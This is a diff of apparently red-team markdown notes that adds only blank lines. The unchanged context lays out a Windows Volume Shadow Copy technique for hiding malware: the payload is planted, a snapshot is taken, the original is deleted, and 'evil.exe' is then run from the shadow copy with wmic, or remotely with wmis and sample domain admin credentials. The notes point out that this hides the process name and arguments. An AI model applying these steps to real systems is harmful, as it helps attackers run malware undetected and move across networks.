@@ -15,10 +15,20 @@ VSC is a Windows service that’s constantly running and takes snapshots of syst
 
 To exploit it: Drop Malware -> Create VSC (ReadOnly) -> Delete Malware -> Use WMIC to run VSC of malware
 
+
+
+
+
 **Code**: [[
 HKLM\System\CurrentControlSet\Control\BackupResto]]
 
+
+
+
+
 # VSSADMIN – native windows utility
+
+
 
 **Command** ([[vssadmin create command only applies to Server OS (Win2k3,2008)]]):
 
@@ -31,6 +41,12 @@ copy \\?\GLOBALROOT\Device\HardDiskVolumeShadowCopy4\path\to\some\file e:\files
 
 ```
 
+
+
+
+
+
+
 **Command** ([[Use WMIC process call to run an .exe from a Volume Shadow Copy]]):
 
 ```bash
@@ -38,9 +54,15 @@ wmic process call create \\.\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows
 
 ```
 
+
+
+
+
 This process will not show the image name (executable filename) or command line parameters in the task list.
 
 The file cannot be individually deleted from the shadow copy once created. The entire shadow copy must be deleted to remove it.
+
+
 
 **Command** ([[Execute VSC malware remotely]]):
 
@@ -48,3 +70,9 @@ The file cannot be individually deleted from the shadow copy once created. The e
 wmis -U DOMAIN\domainadminsvc%domainadminsvc123 //ServerName \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\system32\evil.exe
 
 ```
+
+
+
+
+
+
